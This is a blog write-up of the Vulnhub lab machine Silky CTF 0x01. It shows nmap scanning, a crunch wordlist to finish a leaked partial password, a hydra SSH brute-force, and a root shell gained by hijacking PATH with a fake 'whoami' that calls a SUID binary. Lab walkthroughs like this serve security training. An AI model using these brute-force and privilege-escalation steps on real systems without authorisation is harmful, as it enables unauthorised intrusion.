---
layout:   post
title:      "Vulnhub - Silky CTF 0x01"
date:       2019-07-8 
author:     "D4mianwayne"
tag:      nmap, ctf, vulnhub
category: Vulnhub
---

Today, we are going to pwn Silky CTF: 0x01 from Vulnhub.

# Methodology

* Host Discovery
* Nmap Scan of the machine
* Checking for disallowed entry in `robots.txt`
* Password recovery
* SSH bruteforce of user silky
* Privilege Escalation

# Host Discovery

Running `nmap -sn 192.168.43.0/24` will quickly gives the list of alive host from where we can see our silky machine ip.

![](/img/silky/host.png)

# Nmap

Starting with nmap, we do `nmap -sV -sC -A 192.168.43.232`. Although this command is very useful as it provides us a good amount of information on our host.

![](/img/silky/nmap.png)

# HTTP Enumeration

So, from above nmap result we can see there's a note.txt is on the server. Accessing that webpage gives german text which translates to:

>I absolutely have to remove the password from the page, after all, the last 2 characters are missing. But still.

Hmm, I didn't see any password. So I run dirb but no luck. So I went to examine the index page and from the source we can see that there is a javascript file, so I checked it and found first five characters of password. Now we need to guess 2 mre characters.

![](/img/silky/js.png)


# Password Recovery and SSH bruteforce

### Generating Custom Passwords
So, one of the useful tool here is `crunch` available on kali linux, so I used it to make a password file.

```

crunch 7 7 s1lKy^% > pass.txt

```

#### Command Explaination

`7 7` - Since we know that password is 7 character long we use it define that we need minimum of 7 and maximum of 7 characters/
`^%` - This is used to specified that last 2nd character is a symbol and last one is a digit.

### SSH Bruteforce

So, whenever it comes to bruteforce hydra to the rescue.

```

hydra -l silky -P pass.txt 192.168.43.232 ssh

```

![](/img/silky/ssh.png)


# Privilege Escalation

So, trying our `find / -perm -u=s -type f 2>/dev/null` gives a interesting binary executable file named `sky`.

![](/img/silky/find.png)

So, using `strings /usr/bin/sky` reveals some information on how the binary works.

![](/img/silky/strings.png)

#### Spawning root shell by xploiting PATH variable

So, as we know it is using `whoami` so I did the following:

```

cd /tmp
echo "/bin/sh" > whoami
chmod 777 whoami
sky

```

Kaboom, we're root now.

![](/img/silky/root.png)


This was an easy Vulnhub machine and a great way to learn about generating custom passwords using `crunch`.

